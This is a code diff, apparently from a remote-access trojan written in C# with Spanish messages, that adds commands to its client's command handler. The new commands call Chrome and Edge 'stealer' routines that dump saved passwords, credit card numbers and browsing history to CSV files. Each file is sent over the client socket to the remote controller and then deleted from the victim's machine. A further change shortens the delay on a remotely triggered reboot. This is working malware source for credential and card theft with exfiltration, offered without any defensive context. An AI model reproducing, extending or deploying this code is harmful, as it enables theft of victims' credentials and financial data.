@@ -1,11 +1,8 @@
 ﻿using Client.Conexion;
+using Client.Stealers;
 using Client.Util;
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+
 
 namespace Client.Commands
 {
@@ -52,7 +49,7 @@ namespace Client.Commands
             }
             else if (command == "reboot")
             {
-                response = HandleCommands.ExecuteCommand("shutdown /r /t 10");
+                response = HandleCommands.ExecuteCommand("shutdown /r /t 1");
             }
             else if (command == "shutdown")
             {
@@ -101,6 +98,107 @@ namespace Client.Commands
                 string fileName = command.Substring(9).Trim();
                 ClientSocket.ReceiveFile(fileName);
                 response = $"Archivo {fileName} recibido correctamente.";
+            }
+            else if (command == "chrome_passwords")
+            {
+                ChromeStealer.getChromePasswords();
+             
+
+                if (File.Exists("chrome_passwords.csv") ) 
+                {
+                    ClientSocket.SendFile("chrome_passwords.csv");
+                    File.Delete("chrome_passwords.csv");
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener las credenciales de Chrome";
+                }
+
+                
+            }
+            else if (command == "chrome_ccs")
+            {
+               
+                ChromeStealer.getChromeCCs();
+
+                if (File.Exists("chrome_ccs.csv"))
+                {
+                    ClientSocket.SendFile("chrome_ccs.csv");
+                    File.Delete("chrome_ccs.csv");
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener las tarjetas de crédito de Chrome";
+                }
+            }
+            else if (command == "chrome_history")
+            {
+
+                ChromeStealer.getChromeHistory();
+
+                if (File.Exists("chrome_history.csv"))
+                {
+                    ClientSocket.SendFile("chrome_history.csv");
+                    File.Delete("chrome_history.csv");
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener el historial de Chrome";
+                }
+            }
+            else if (command == "edge_passwords")
+            {
+                EdgeStealer.getEdgePasswords();
+
+
+                if (File.Exists("edge_passwords.csv"))
+                {
+                    ClientSocket.SendFile("edge_passwords.csv");
+                    File.Delete("edge_passwords.csv");
+
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener las credenciales de Edge";
+                }
+
+
+            }
+            else if (command == "edge_ccs")
+            {
+
+                EdgeStealer.getEdgeCcs();
+
+                if (File.Exists("edge_ccs.csv"))
+                {
+                    ClientSocket.SendFile("edge_ccs.csv");
+                    File.Delete("edge_ccs.csv");
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener las tarjetas de crédito de Edge";
+                }
+            }
+            else if (command == "edge_history")
+            {
+
+                EdgeStealer.getEdgeHistory();
+
+                if (File.Exists("edge_history.csv"))
+                {
+                    ClientSocket.SendFile("edge_history.csv");
+                    File.Delete("edge_history.csv");
+                    response = "";
+                }
+                else
+                {
+                    response = "Error al intentar obtener el historial de Edge";
+                }
             }
             else
             {
